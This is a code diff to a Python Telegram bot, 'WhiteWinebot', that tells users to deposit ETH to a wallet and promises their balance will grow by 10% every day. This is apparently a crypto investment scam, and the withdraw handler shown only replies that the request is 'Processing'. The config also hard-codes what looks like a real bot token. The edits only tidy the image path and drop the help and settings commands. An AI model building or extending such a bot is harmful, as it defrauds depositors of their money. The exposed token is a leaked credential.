@@ -3,6 +3,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, ContextTyp
 from web3 import Web3
 import sqlite3
 import time
+import os
 
 # --- CONFIGURATION ---
 BOT_TOKEN = '7829388143:AAEnFL-pBXJ65sE4B1QmRvsC6YIw_HUsGUw'
@@ -63,8 +64,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("Copy Wallet Address", callback_data="copy_wallet_address")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
+    image_path = os.path.join(os.path.dirname(__file__), '31231.png')
     try:
-        with open("C:\\Users\\ikone\\Desktop\\31231.png", 'rb') as image:
+        with open(image_path, 'rb') as image:
             await context.bot.send_photo(chat_id=update.effective_chat.id, photo=image)
     except FileNotFoundError:
         await update.message.reply_text("❌ Could not find the welcome image. Please check the file path.")
@@ -72,7 +74,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"🎉 Welcome to the WhiteWinebot, *{user_name}*! 🚀\n\n"
         f"💰 Your current balance: {bal:.4f} ETH 💰\n\n"
-        "👉 How it works:\n\n"
+        "👇 How it works:\n\n"
         "💸 Deposit ETH to your wallet address.\n"
         "📈 Watch your deposit grow by 10% every day! 💰✨\n"
         "🔁 Check your balance anytime using /balance.\n\n"
@@ -111,36 +113,10 @@ async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("👌 Withdrawal request received. Processing...")
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_name = update.message.from_user.first_name
-    await update.message.reply_text(
-        f"👋 Hello, *{user_name}*! Here's how you can use the bot effectively:\n\n"
-        "1⃣ **Deposit**: Use the /deposit command to send ETH to your wallet address.\n"
-        f"🔑 Address: {WALLET_ADDRESS} 🏦\n\n"
-        "2⃣ **Balance**: Use /balance to check your current balance and growth. 📈\n\n"
-        "3⃣ **Withdraw**: Use /withdraw <amount> to withdraw funds. 💵\n\n"
-        "4⃣ **Settings**: Use /settings to learn about additional features and options.\n\n"
-        "💡 If you need further assistance, just ask!"
-    )
-
-async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_name = update.message.from_user.first_name
-    await update.message.reply_text(
-        f"🌟 *{user_name}*, here are some advanced options and tips:\n\n"
-        "1⃣ **Priority Fees** 🚀: Speed up transactions with priority fees.\n\n"
-        "2⃣ **Growth** 💡: Watch your balance grow automatically by 10% daily.\n\n"
-        "3⃣ **Withdraw Anytime** 💵: Flexible withdrawal options at your fingertips.\n\n"
-        "We're here to make your crypto journey seamless!"
-    )
-
 # --- BOT INITIALIZATION ---
 application = Application.builder().token(BOT_TOKEN).build()
-
 application.add_handler(CommandHandler('start', start))
 application.add_handler(CommandHandler('deposit', deposit))
 application.add_handler(CommandHandler('balance', balance))
 application.add_handler(CommandHandler('withdraw', withdraw))
-application.add_handler(CommandHandler('help', help_command))
-application.add_handler(CommandHandler('settings', settings))
-
 application.run_polling()
